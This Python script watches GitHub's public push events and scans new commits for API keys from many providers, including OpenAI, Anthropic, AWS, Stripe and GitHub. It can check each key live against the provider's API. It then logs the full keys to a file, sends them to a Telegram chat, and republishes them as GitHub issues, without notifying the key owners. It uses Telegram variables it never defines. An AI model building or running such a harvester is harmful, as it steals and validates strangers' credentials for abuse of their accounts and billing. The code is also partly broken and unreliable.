import os
import re
import time
import math
import requests
from dotenv import load_dotenv
from collections import deque, Counter

# ──────────────────────────────────────────────
# LOAD ENV
# ──────────────────────────────────────────────

load_dotenv()

GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
GITHUB_REPO = os.getenv("GITHUB_REPOSITORY", "")
IS_CI = os.getenv("CI", "").lower() == "true"

VALIDATE_KEYS = os.getenv("VALIDATE_KEYS", "false").lower() == "true"
MIN_ENTROPY = float(os.getenv("MIN_ENTROPY", "3.6"))

OUTPUT_FILE = "leaked2.txt"
SEEN_EVENTS = deque(maxlen=3000)
SEEN_KEYS = set()

# ──────────────────────────────────────────────
# HEADERS
# ──────────────────────────────────────────────

HEADERS = {
    "User-Agent": "GitHub-Secret-Scanner",
    "Accept": "application/vnd.github+json",
}

if GITHUB_TOKEN:
    HEADERS["Authorization"] = f"Bearer {GITHUB_TOKEN}"

# ──────────────────────────────────────────────
# PATTERNS
# ──────────────────────────────────────────────

PATTERNS = [
    # ── OpenAI ──
    (r"sk-proj-[A-Za-z0-9_-]{20,100}T3BlbkFJ[A-Za-z0-9_-]{20,100}", "OpenAI Project"),
    (r"sk-svcacct-[A-Za-z0-9_-]{20,100}T3BlbkFJ[A-Za-z0-9_-]{20,100}", "OpenAI Service Account"),
    (r"sk-admin-[A-Za-z0-9_-]{20,100}T3BlbkFJ[A-Za-z0-9_-]{20,100}", "OpenAI Admin"),
    (r"sk-[A-Za-z0-9]{20,42}T3BlbkFJ[A-Za-z0-9]{20,42}", "OpenAI Legacy"),
    # ── Anthropic ──
    (r"sk-ant-api03-[A-Za-z0-9_-]{70,110}", "Anthropic"),
    (r"sk-ant-oat[0-9a-z]+-[A-Za-z0-9_-]{50,90}", "Anthropic"),
    # ── Google ──
    (r"AIzaSy[A-Za-z0-9_-]{33}", "Google Gemini"),
    # ── xAI Grok ──
    (r"xai-[A-Za-z0-9]{30,70}", "xAI Grok"),
    # ── DeepSeek ──
    (r"sk-[a-f0-9]{32,64}", "DeepSeek"),
    # ── OpenRouter ──
    (r"sk-or-v1-[A-Za-z0-9_-]{40,100}", "OpenRouter"),
    # ── Groq ──
    (r"gsk_[a-zA-Z0-9]{45,60}", "Groq"),
    # ── HuggingFace ──
    (r"hf_[A-Za-z0-9]{30,60}", "HuggingFace"),
    # ── Replicate ──
    (r"r8_[A-Za-z0-9]{30,50}", "Replicate"),
    # ── Mistral ──
    (r"mist_[A-Za-z0-9]{25,60}", "Mistral"),
    # ── Perplexity ──
    (r"pplx-[A-Za-z0-9_-]{30,80}", "Perplexity"),
    # ── Together AI ──
    (r"together_[A-Za-z0-9]{30,60}", "Together AI"),
    # ── Fireworks ──
    (r"fw_[A-Za-z0-9]{30,50}", "Fireworks"),
    # ── Cohere ──
    (r"(cohere|Cohere)[A-Za-z0-9_-]{30,60}", "Cohere"),
    # ── GitHub ──
    (r"ghp_[A-Za-z0-9]{36,40}", "GitHub PAT"),
    (r"github_pat_[A-Za-z0-9_]{60,90}", "GitHub PAT (fine-grained)"),
    # ── GitLab ──
    (r"glpat-[A-Za-z0-9_-]{20,40}", "GitLab PAT"),
    # ── Slack ──
    (r"xox[baprs]-[A-Za-z0-9-]{20,80}", "Slack Token"),
    # ── Stripe ──
    (r"sk_live_[A-Za-z0-9]{20,40}", "Stripe Live Secret"),
    (r"pk_live_[A-Za-z0-9]{20,40}", "Stripe Live Publishable"),
    (r"rk_live_[A-Za-z0-9]{20,40}", "Stripe Live Restricted"),
    # ── AWS ──
    (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
    # ── Azure ──
    (r"DefaultEndpointsProtocol=https;AccountName=[A-Za-z0-9]+;AccountKey=[A-Za-z0-9+/=]{40,100}", "Azure Connection String"),
]

ALLOWED_EXTENSIONS = {
    ".py", ".js", ".ts", ".jsx", ".tsx", ".java",
    ".go", ".rb", ".php", ".sh", ".env",
    ".yml", ".yaml", ".json", ".ini",
    ".cfg", ".conf", ".toml", ".md", ".txt"
}

# ──────────────────────────────────────────────
# UTILITIES
# ──────────────────────────────────────────────

def calculate_entropy(s: str) -> float:
    if len(s) < 20:
        return 0.0
    counter = Counter(s)
    probs = [c / len(s) for c in counter.values()]
    return -sum(p * math.log2(p) for p in probs if p > 0)


def send_telegram(message: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
    }

    try:
        requests.post(url, data=payload, timeout=7)
    except Exception:
        pass


def validate_key(service: str, key: str):
    if not VALIDATE_KEYS:
        return "Validation disabled"

    try:
        # ── OpenAI ──
        if "OpenAI" in service:
            r = requests.get(
                "https://api.openai.com/v1/models",
                headers={"Authorization": f"Bearer {key}"},
                timeout=7,
            )
            return r.status_code == 200

        if "Anthropic" in service:
            r = requests.get(
                "https://api.anthropic.com/v1/models",
                headers={"x-api-key": key},
                timeout=7,
            )
            return r.status_code == 200

        if "Google" in service:
            r = requests.get(
                f"https://generativelanguage.googleapis.com/v1beta/models?key={key}",
                timeout=7,
            )
            return r.status_code == 200

        if service == "xAI Grok":
            r = requests.get(
                "https://api.x.ai/v1/models",
                headers={"Authorization": f"Bearer {key}"},
                timeout=7,
            )
            return r.status_code == 200

        if service == "Groq":
            r = requests.get(
                "https://api.groq.com/openai/v1/models",
                headers={"Authorization": f"Bearer {key}"},
                timeout=7,
            )
            return r.status_code == 200

        if service == "DeepSeek":
            r = requests.get(
                "https://api.deepseek.com/v1/models",
                headers={"Authorization": f"Bearer {key}"},
                timeout=7,
            )
            return r.status_code == 200

        if service == "OpenRouter":
            r = requests.get(
                "https://openrouter.ai/api/v1/models",
                headers={"Authorization": f"Bearer {key}"},
                timeout=7,
            )
            return r.status_code == 200

        if service == "HuggingFace":
            r = requests.get(
                "https://huggingface.co/api/models?limit=1",
                headers={"Authorization": f"Bearer {key}"},
                timeout=7,
            )
            return r.status_code == 200

        if service == "Replicate":
            r = requests.get(
                "https://api.replicate.com/v1/models",
                headers={"Authorization": f"Bearer {key}"},
                timeout=7,
            )
            return r.status_code == 200

        if service == "Mistral":
            r = requests.get(
                "https://api.mistral.ai/v1/models",
                headers={"Authorization": f"Bearer {key}"},
                timeout=7,
            )
            return r.status_code == 200

        if "GitHub" in service:
            r = requests.get(
                "https://api.github.com/user",
                headers={"Authorization": f"Bearer {key}"},
                timeout=7,
            )
            return r.status_code == 200

        if "Stripe" in service:
            r = requests.get(
                "https://api.stripe.com/v1/balance",
                auth=(key, ""),
                timeout=7,
            )
            return r.status_code == 200

    except Exception:
        return "Validation error"

    return "Unknown service"

# ──────────────────────────────────────────────
# SCANNING LOGIC
# ──────────────────────────────────────────────

def scan_diff(diff_text, filename, commit_url):
    if not any(filename.lower().endswith(ext) for ext in ALLOWED_EXTENSIONS):
        return []

    findings = []

    for line in diff_text.splitlines():
        if not line.startswith("+"):
            continue

        content = line[1:].strip()

        for pattern, service in PATTERNS:
            matches = re.findall(pattern, content)
            for key in matches:

                if len(key) < 32:
                    continue

                if re.match(r"^[0-9a-fA-F]{40,}$", key):
                    continue

                entropy = calculate_entropy(key)
                if entropy < MIN_ENTROPY:
                    continue

                valid = validate_key(service, key)

                findings.append({
                    "service": service,
                    "key": key,
                    "file": filename,
                    "commit": commit_url,
                    "entropy": entropy,
                    "valid": valid,
                })

    return findings


def process_push_event(event):
    payload = event.get("payload", {})
    if "head" not in payload or "before" not in payload:
        return

    repo = event["repo"]["name"]
    head = payload["head"]
    before = payload["before"]

    compare_url = f"https://api.github.com/repos/{repo}/compare/{before}...{head}"

    r = requests.get(compare_url, headers=HEADERS, timeout=10)
    if r.status_code != 200:
        return

    data = r.json()

    for file in data.get("files", []):
        if "patch" not in file:
            continue

        findings = scan_diff(
            file["patch"],
            file["filename"],
            data.get("html_url", ""),
        )

        for item in findings:
            log_line = (
                f"{repo} | {item['file']} | {item['service']} | "
                f"{item['key']} | Entropy:{item['entropy']:.2f} | "
                f"Valid:{item['valid']} | {item['commit']}\n"
            )

            with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
                f.write(log_line)

            send_telegram(
                f"<b>Leak Detected</b>\n\n"
                f"Service: {item['service']}\n"
                f"Key: <code>{item['key']}</code>\n"
                f"Repo: {repo}\n"
                f"File: {item['file']}\n"
                f"Valid: {item['valid']}\n"
                f"{item['commit']}"
            )

            if IS_CI and GITHUB_REPO:
                issue_title = f"Leaked {item['service']} key in {repo}"
                issue_body = (
                    f"**Service:** {item['service']}\n\n"
                    f"**Key:** `{item['key']}`\n\n"
                    f"**Repo:** {repo}\n\n"
                    f"**File:** {item['file']}\n\n"
                    f"**Entropy:** {item['entropy']:.2f}\n\n"
                    f"**Valid:** {item['valid']}\n\n"
                    f"**Commit:** {item['commit']}\n\n"
                    f"---\n*Automated scan*"
                )
                try:
                    requests.post(
                        f"https://api.github.com/repos/{GITHUB_REPO}/issues",
                        headers=HEADERS,
                        json={"title": issue_title[:256], "body": issue_body},
                        timeout=10,
                    )
                except Exception:
                    pass


# ──────────────────────────────────────────────
# MAIN LOOP
# ──────────────────────────────────────────────

def scan_once():
    r = requests.get(
        "https://api.github.com/events",
        params={"per_page": 100},
        headers=HEADERS,
        timeout=15,
    )
    if r.status_code != 200:
        print(f"API error: {r.status_code}")
        return

    events = r.json()
    count = 0
    for event in reversed(events):
        eid = event.get("id")
        if eid in SEEN_EVENTS:
            continue
        SEEN_EVENTS.append(eid)

        if event.get("type") == "PushEvent":
            process_push_event(event)
            count += 1

    print(f"Scanned {count} push events")


def main():
    print("GitHub Public Push Secret Scanner")
    print(f"Validation: {VALIDATE_KEYS}")

    if IS_CI:
        scan_once()
        return

    print("Scanning...\n")
    while True:
        try:
            scan_once()
            time.sleep(8)
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(30)


if __name__ == "__main__":
    main()
